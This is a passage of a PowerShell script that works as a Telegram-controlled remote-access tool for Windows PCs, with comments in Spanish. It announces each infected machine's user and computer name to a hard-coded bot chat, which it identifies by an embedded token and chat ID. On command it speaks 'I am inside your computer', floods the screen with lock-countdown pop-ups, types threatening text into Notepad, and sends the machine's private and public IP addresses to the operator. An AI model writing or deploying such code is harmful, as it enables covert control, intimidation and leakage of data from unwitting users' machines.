# ==============================================================================
# CONFIGURACIÓN DEL BOT DE TELEGRAM (Pon tus datos aquí)
# ==============================================================================
$Token  = "8935867266:AAELjvUiJRXauSgYmmHAMmut-SOJWXyYImg" # REEMPLAZA CON TU TOKEN REAL COMPLETO
$ChatID = "1018796719"                                    # REEMPLAZA CON TU CHAT ID REAL COMPLETO

# Construcción de URL fija ultra-estable que acabamos de validar
$URL    = "https://api.telegram.org/bot" + $Token
$MiPC   = $env:COMPUTERNAME
$User   = $env:USERNAME
# ==============================================================================
# NO BORRAR #############################################################
# ==============================================================================
# ==============================================================================
# CONFIGURACIÓN DEL BOT DE TELEGRAM 
# ==============================================================================
# Registrar APIs de pantalla de Windows de forma segura
try {
    $MethodDefinition = '[DllImport("user32.dll")] public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);'
    Add-Type -MemberDefinition $MethodDefinition -Name "Win32Utils" -Namespace "Win32" -ErrorAction SilentlyContinue
} catch {}

# Habilitar TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ==============================================================================
# LIMPIAR HISTORIAL ANTES DE INICIAR
# ==============================================================================
$LastUpdateID = 0
try {
    $PreCheck = Invoke-RestMethod -Uri "$URL/getUpdates?timeout=1" -Method Get
    if ($PreCheck.result.Count -gt 0) {
        $LastUpdateID = $PreCheck.result[-1].update_id + 1
        [void](Invoke-RestMethod -Uri "$URL/getUpdates?offset=$LastUpdateID&timeout=1" -Method Get)
    }
} catch {}

# --- NOTIFICAR A TELEGRAM QUE LA PC SE ENCENDIÓ ---
try {
    $MensajeInicio = "PC En Linea y Protegida: " + $User + "@" + $MiPC
    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $MensajeInicio })
} catch {}

# ==============================================================================
# BUCLE PRINCIPAL CON SISTEMA DE IDS NUMÉRICOS CORREGIDO
# ==============================================================================
while ($true) {
    try {
        $Updates = Invoke-RestMethod -Uri "$URL/getUpdates?offset=$LastUpdateID&timeout=15" -Method Get
        
        foreach ($Update in $Updates.result) {
            $LastUpdateID = $Update.update_id + 1
            $TextoRecibido = $Update.message.text
            $RemitenteChatID = $Update.message.chat.id

            if ($RemitenteChatID -eq $ChatID -and $null -ne $TextoRecibido) {
                
                # CORRECCIÓN DE MATRIZ: Extraemos de forma segura el comando y el ID del argumento
                $Partes = $TextoRecibido -split " "
                $Comando = [string]$Partes[0]
                $Comando = $Comando.ToLower()
                
               $IDDestino = ""
                if ($Partes.Count -gt 1) {
                    $IDDestino = [string]$Partes[1]
                }

                # CALCULAR ID DE 3 DÍGITOS ESTABLE (Fijo y único para cada PC)
                $Md5 = [System.Security.Cryptography.MD5]::Create()
                $HashBytes = $Md5.ComputeHash([System.Text.Encoding]::ASCII.GetBytes($MiPC))
                $IdUnico = ([BitConverter]::ToUInt16($HashBytes, 0) % 900) + 100
                $MiIDNum = [string]$IdUnico

                # --- COMANDO GLOBAL: /lista ---
                if ($Comando -eq "/lista") {
                    $RespuestaLista = "🖥️ EQUIPO EN LINEA:`nID Numerico: [" + $MiIDNum + "] -> " + $User + "@" + $MiPC
                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $RespuestaLista })
                    continue
                }

                # --- COMANDO GLOBAL DE AYUDA: /ayuda ---
                if ($Comando -eq "/ayuda") {
                    $TextoAyuda = "MANUAL DE CONTROL NUMERICO`n`n" +
                                  "Comandos Globales:`n" +
                                  "• /lista - Ver que numero de ID tomo cada PC.`n" +
                                  "• /ayuda - Ver este menu.`n`n" +
                                  "Comandos Individuales (Deja un espacio y pon el numero de la PC):`n" +
                                  " /cuenta [Numero]`n" +
                                  " /dentro [Numero]`n" +
                                  " /notepad [Numero]`n" +
                                  " /red [Numero]`n`n" +
                                  "Ejemplo de uso: /red " + $MiIDNum
                    
                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $TextoAyuda })
                    continue
                }

                # VALIDACIÓN CRÍTICA: Solo ejecuta si el número coincide con el de esta máquina
                if ($IDDestino -eq $MiIDNum -and $IDDestino -ne "") {
                    
                    switch ($Comando) {
                        
                        "/dentro" {
                            Add-Type -AssemblyName System.Speech
                            $synthesizer = New-Object System.Speech.Synthesis.SpeechSynthesizer
                            $synthesizer.Speak("Hola. Estoy dentro de tu computadora.")
                        }                       
                        
                        "/cuenta" {
                            $wsh = New-Object -ComObject WScript.Shell
                            for ($i = 60; $i -gt 0; $i--) {
                                $wsh.Popup("Faltan $i segundos para desbloquear la pantalla.", 1, "Cuenta Regresiva", 0 + 48 + 4096)
                            }
                        }
                           
                        "/notepad" {
                            Start-Process "notepad.exe"
                            Start-Sleep -Milliseconds 500
                            $wsh = New-Object -ComObject WScript.Shell
                            $wsh.SendKeys("Te estoy observando por Internet... 👀")
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Bloc de notas abierto en ID " + $MiIDNum })
                        }

                        "/red" {
                            $IpPrivada = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" -and $_.InterfaceAlias -notlike "*Virtual*" -and $_.IPAddress -notlike "127.*" }).IPAddress | Select-Object -First 1
                            $IpPublica = "Desconocida"
                            try {
                                $IpPublica = (Invoke-RestMethod -Uri "https://ipify.org" -TimeoutSec 5).Trim()
                            } catch {}

                            $ReporteRed = " REPORTE DE RED (ID: " + $MiIDNum + ")`n" +
                                          " IP Privada (Local): " + $IpPrivada + "`n" +
                                          " IP Pública (Internet): " + $IpPublica
                                          
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $ReporteRed })
                        }
                    }
                }
            }
        }
